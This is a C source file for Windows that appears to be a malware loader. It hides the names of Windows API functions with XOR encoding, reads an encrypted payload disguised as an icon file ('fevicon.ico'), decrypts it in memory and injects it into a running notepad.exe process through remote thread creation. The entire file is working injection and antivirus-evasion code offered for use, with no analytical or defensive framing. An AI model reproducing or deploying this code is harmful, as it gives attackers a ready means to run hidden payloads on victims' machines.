#include <windows.h>

#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include "resources.h"

#include <tlhelp32.h>

HANDLE(WINAPI * pCreateToolhelp32Snapshot)(
    DWORD dwFlags,
    DWORD th32ProcessID
);

BOOL(WINAPI * pProcess32First)(
    HANDLE hSnapshot,
    LPPROCESSENTRY32 lppe
);

BOOL(WINAPI * pProcess32Next)(
    HANDLE hSnapshot,
    LPPROCESSENTRY32 lppe
);

int(WINAPI * plstrcmpiA)(
    LPCSTR lpString1,
    LPCSTR lpString2
);

LPVOID(WINAPI * pVirtualAllocEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
);

BOOL(WINAPI * pWriteProcessMemory)(
    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T * lpNumberOfBytesWritten
);

HANDLE(WINAPI * pCreateRemoteThread)(
    HANDLE hProcess,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId
);

DWORD(WINAPI * pWaitForSingleObject)(
    HANDLE hHandle,
    DWORD dwMilliseconds
);

BOOL(WINAPI * pCloseHandle)(
    HANDLE hObject
);

HGLOBAL(WINAPI * pLoadResource)(
    HMODULE hModule,
    HRSRC hResInfo
);

LPVOID(WINAPI * pLockResource)(
    HGLOBAL hResData
);

DWORD(WINAPI * pSizeofResource)(
    HMODULE hModule,
    HRSRC hResInfo
);

LPVOID(WINAPI * pVirtualAlloc)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
);

HANDLE(WINAPI * pOpenProcess)(
    DWORD dwDesiredAccess,
    BOOL bInheritHandle,
    DWORD dwProcessId
);

VOID(WINAPI * pRtlMoveMemory)(
    VOID UNALIGNED * Destination,
    VOID UNALIGNED * Source,
    SIZE_T Length
);

HRSRC(WINAPI * pFindResourceA)(
    HMODULE hModule,
    LPCSTR lpName,
    LPCSTR lpType
);

char key[] = "<YOUR-SUPER-SECRET-KEY>";

void XOR(char * buffer, size_t buffer_size,
    const char * secret, size_t secret_size) {
    int index;

    index = 0;
    for (size_t pos = 0; pos < buffer_size; ++pos) {
        if (index == secret_size - 1) index = 0;

        buffer[pos] ^= secret[index];
        ++index;
    }
}

void XORString(char * data, size_t data_len, char * key, size_t key_len) {
    for (size_t i = 0; i < data_len; ++i) {
        data[i] ^= key[i % key_len];
    }
    data[data_len] = '\0';
}

int FindTarget(const char * procname) {

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    unsigned char sCreateToolhelp32Snapshot[] = {
        0x26,
        0x1e,
        0x7,
        0x13,
        0x1,
        0x16,
        0x27,
        0x1a,
        0x1f,
        0x9,
        0x1a,
        0x16,
        0x9,
        0x13,
        0x46,
        0x40,
        0x36,
        0x5,
        0x4,
        0x9,
        0x16,
        0x4,
        0xd,
        0x6
    };
    unsigned char sProcess32First[] = {
        0x35,
        0x1e,
        0xd,
        0x11,
        0x10,
        0x0,
        0x0,
        0x46,
        0x42,
        0x23,
        0x1b,
        0x1,
        0x16,
        0x17
    };
    unsigned char sProcess32Next[] = {
        0x35,
        0x1e,
        0xd,
        0x11,
        0x10,
        0x0,
        0x0,
        0x46,
        0x42,
        0x2b,
        0x17,
        0xb,
        0x11
    };
    unsigned char slstrcmpiA[] = {
        0x9,
        0x1f,
        0x16,
        0x0,
        0x16,
        0x1e,
        0x3,
        0x1c,
        0x31
    };
    unsigned char sCloseHandle[] = {
        0x26,
        0x0,
        0xd,
        0x1,
        0x10,
        0x3b,
        0x12,
        0x1b,
        0x14,
        0x9,
        0x17
    };

    XOR((char * ) sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), key, sizeof(key));
    XORString((char * ) sProcess32First, sizeof(sProcess32First), key, sizeof(key));
    XORString((char * ) sProcess32Next, sizeof(sProcess32Next), key, sizeof(key));
    XORString((char * ) slstrcmpiA, sizeof(slstrcmpiA), key, sizeof(key));
    XORString((char * ) sCloseHandle, sizeof(sCloseHandle), key, sizeof(key));

    pCreateToolhelp32Snapshot = GetProcAddress(GetModuleHandle("kernel32.dll"), sCreateToolhelp32Snapshot);
    pProcess32First = GetProcAddress(GetModuleHandle("kernel32.dll"), sProcess32First);
    pProcess32Next = GetProcAddress(GetModuleHandle("kernel32.dll"), sProcess32Next);
    plstrcmpiA = GetProcAddress(GetModuleHandle("kernel32.dll"), slstrcmpiA);
    pCloseHandle = GetProcAddress(GetModuleHandle("kernel32.dll"), sCloseHandle);

    hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!pProcess32First(hProcSnap, & pe32)) {
        pCloseHandle(hProcSnap);
        return 0;
    }

    while (pProcess32Next(hProcSnap, & pe32)) {
        if (plstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    pCloseHandle(hProcSnap);

    return pid;
}

int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;

    unsigned char sVirtualAllocEx[] = {
        0x33,
        0x5,
        0x10,
        0x6,
        0x0,
        0x12,
        0x1f,
        0x34,
        0x1c,
        0x9,
        0x1d,
        0x10,
        0x20,
        0x1b
    };
    unsigned char sWriteProcessMemory[] = {
        0x32,
        0x1e,
        0xb,
        0x6,
        0x10,
        0x23,
        0x1,
        0x1a,
        0x13,
        0x0,
        0x1,
        0x0,
        0x28,
        0x6,
        0x18,
        0x1d,
        0x17,
        0x12
    };
    unsigned char sCreateRemoteThread[] = {
        0x26,
        0x1e,
        0x7,
        0x13,
        0x1,
        0x16,
        0x21,
        0x10,
        0x1d,
        0xa,
        0x6,
        0x16,
        0x31,
        0xb,
        0x7,
        0x17,
        0x4,
        0xf
    };
    unsigned char sCloseHandle[] = {
        0x26,
        0x0,
        0xd,
        0x1,
        0x10,
        0x3b,
        0x12,
        0x1b,
        0x14,
        0x9,
        0x17
    };
    unsigned char sWaitForSingleObject[] = {
        0x32,
        0xd,
        0xb,
        0x6,
        0x33,
        0x1c,
        0x1,
        0x26,
        0x19,
        0xb,
        0x15,
        0x1f,
        0x0,
        0x2c,
        0x17,
        0x18,
        0x0,
        0x8,
        0x11
    };

    XORString((char * ) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
    XORString((char * ) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
    XORString((char * ) sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));
    XORString((char * ) sCloseHandle, sizeof(sCloseHandle), key, sizeof(key));
    XORString((char * ) sWaitForSingleObject, sizeof(sWaitForSingleObject), key, sizeof(key));

    pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualAllocEx);
    pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), sWriteProcessMemory);
    pCreateRemoteThread = GetProcAddress(GetModuleHandle("kernel32.dll"), sCreateRemoteThread);
    pCloseHandle = GetProcAddress(GetModuleHandle("kernel32.dll"), sCloseHandle);
    pWaitForSingleObject = GetProcAddress(GetModuleHandle("kernel32.dll"), sWaitForSingleObject);

    pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    pWriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T * ) NULL);

    hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {
        pWaitForSingleObject(hThread, 500);
        pCloseHandle(hThread);
        return 0;
    }
    return -1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow) {
    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
    HGLOBAL resHandle = NULL;
    HRSRC res;

    int pid = 0;
    HANDLE hProc = NULL;

    unsigned char * payload;
    unsigned int payload_len;

    unsigned char sFindResourceA[] = {
        0x23,
        0x5,
        0xc,
        0x16,
        0x27,
        0x16,
        0x0,
        0x1a,
        0x5,
        0x17,
        0x11,
        0x16,
        0x24
    };
    unsigned char sLoadResource[] = {
        0x29,
        0x3,
        0x3,
        0x16,
        0x27,
        0x16,
        0x0,
        0x1a,
        0x5,
        0x17,
        0x11,
        0x16
    };
    unsigned char sLockResource[] = {
        0x29,
        0x3,
        0x1,
        0x19,
        0x27,
        0x16,
        0x0,
        0x1a,
        0x5,
        0x17,
        0x11,
        0x16
    };
    unsigned char sSizeofResource[] = {
        0x36,
        0x5,
        0x18,
        0x17,
        0x1a,
        0x15,
        0x21,
        0x10,
        0x3,
        0xa,
        0x7,
        0x1,
        0x6,
        0x6
    };
    unsigned char sVirtualAlloc[] = {
        0x33,
        0x5,
        0x10,
        0x6,
        0x0,
        0x12,
        0x1f,
        0x34,
        0x1c,
        0x9,
        0x1d,
        0x10
    };
    unsigned char sOpenProcess[] = {
        0x2a,
        0x1c,
        0x7,
        0x1c,
        0x25,
        0x1,
        0x1c,
        0x16,
        0x15,
        0x16,
        0x1
    };
    unsigned char sRtlMoveMemory[] = {
        0x37,
        0x18,
        0xe,
        0x3f,
        0x1a,
        0x5,
        0x16,
        0x38,
        0x15,
        0x8,
        0x1d,
        0x1,
        0x1c
    };
    unsigned char sCloseHandle[] = {
        0x26,
        0x0,
        0xd,
        0x1,
        0x10,
        0x3b,
        0x12,
        0x1b,
        0x14,
        0x9,
        0x17
    };

    XORString((char * ) sFindResourceA, sizeof(sFindResourceA), key, sizeof(key));
    XORString((char * ) sLoadResource, sizeof(sLoadResource), key, sizeof(key));
    XORString((char * ) sLockResource, sizeof(sLockResource), key, sizeof(key));
    XORString((char * ) sSizeofResource, sizeof(sSizeofResource), key, sizeof(key));
    XORString((char * ) sVirtualAlloc, sizeof(sVirtualAlloc), key, sizeof(key));
    XORString((char * ) sOpenProcess, sizeof(sOpenProcess), key, sizeof(key));
    XORString((char * ) sRtlMoveMemory, sizeof(sRtlMoveMemory), key, sizeof(key));
    XORString((char * ) sCloseHandle, sizeof(sCloseHandle), key, sizeof(key));

    pFindResourceA = GetProcAddress(GetModuleHandle("kernel32.dll"), sFindResourceA);
    pLoadResource = GetProcAddress(GetModuleHandle("kernel32.dll"), sLoadResource);
    pLockResource = GetProcAddress(GetModuleHandle("kernel32.dll"), sLockResource);
    pSizeofResource = GetProcAddress(GetModuleHandle("kernel32.dll"), sSizeofResource);
    pVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualAlloc);
    pOpenProcess = GetProcAddress(GetModuleHandle("kernel32.dll"), sOpenProcess);
    pRtlMoveMemory = GetProcAddress(GetModuleHandle("Ntdll.dll"), sRtlMoveMemory);
    pCloseHandle = GetProcAddress(GetModuleHandle("kernel32.dll"), sCloseHandle);

    HANDLE hFile = CreateFile("C:\\Users\<YOUR-PATH>\\fevicon.ico", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 1;

    DWORD fileSize = GetFileSize(hFile, NULL);
    unsigned char * fileData = (unsigned char * ) malloc(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, fileData, fileSize, & bytesRead, NULL);
    CloseHandle(hFile);

    payload = fileData;
    payload_len = fileSize;

    exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    pRtlMoveMemory(exec_mem, payload, payload_len);

    XOR((char * ) exec_mem, payload_len, key, sizeof(key));

    pid = FindTarget("notepad.exe");

    if (pid) {
        hProc = pOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            FALSE, (DWORD) pid);
        if (hProc != NULL) {
            Inject(hProc, exec_mem, payload_len);
            pCloseHandle(hProc);
        }
    }
    return 0;
}